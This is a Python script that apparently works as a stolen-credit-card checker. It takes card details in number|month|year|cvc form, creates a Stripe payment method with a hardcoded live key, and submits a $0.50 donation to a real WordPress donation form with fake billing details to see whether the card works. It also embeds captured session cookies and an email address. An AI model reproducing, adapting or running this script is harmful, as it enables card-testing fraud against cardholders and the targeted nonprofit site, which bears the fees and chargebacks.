import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F944bb046f5%3B+stripe-js-v3%2F944bb046f5%3B+card-element&key=pk_live_51R4SeyGOsQZM88OuzJiU83Qi0GLGVfJFQdCzcqmwKjBuLkLmfKuxr9A8aP7lYTwOG1DSy8yMMHq2eeBaJGY21gtj00D1OAIF6J'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__cf_bm': 'tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw',
	    '_fbp': 'fb.2.1740399662778.157652016478123277',
	    'cookieyes-consent': 'consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
	    '_ga_59B60VWWYG': 'GS1.1.1740399662.1.0.1740399662.0.0.1057425111',
	    '_ga': 'GA1.1.1773205121.1740399663',
	    '__stripe_mid': '69b28a7c-439a-4b6a-8204-ab46564f3112802de2',
    '__stripe_sid': '5dc2313a-f1fd-47cd-bf86-77943a6e5237c75643',
	    '_gcl_au': '1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	}
	
	headers = {
	    'authority': 'gardenofnoeticarts.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__cf_bm=tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw; _fbp=fb.2.1740399662778.157652016478123277; cookieyes-consent=consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _ga_59B60VWWYG=GS1.1.1740399662.1.0.1740399662.0.0.1057425111; _ga=GA1.1.1773205121.1740399663; __stripe_mid=f435ef71-f199-4863-9e2b-f51dd02b4b2731905d; __stripe_sid=65f16e25-cf7e-4d24-b7ac-3a8b2b0927fa020fce; _gcl_au=1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	    'origin': 'https://gardenofnoeticarts.org',
	    'referer': 'https://gardenofnoeticarts.org/unveiling-the-mythos-of-iran/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1758762639654',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=969&_fluentform_8_fluentformnonce=2ba5c0ca2a&_wp_http_referer=%2Funveiling-the-mythos-of-iran%2F&names%5Bfirst_name%5D=Yoon%20Myat&names%5Blast_name%5D=XIL&email=kyawlay4969%40gmail.com&payment_input=Other%20Amount&custom-payment-amount=0.50&address_1%5Baddress_line_1%5D=NewYork&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=NewYork&address_1%5Bstate%5D=NewYork&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&payment_method=stripe&__entry_intermediate_hash=84c213af8a32935ffb15be6a06e1a331&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '8',
	}
	
	r2 = requests.post('https://gardenofnoeticarts.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
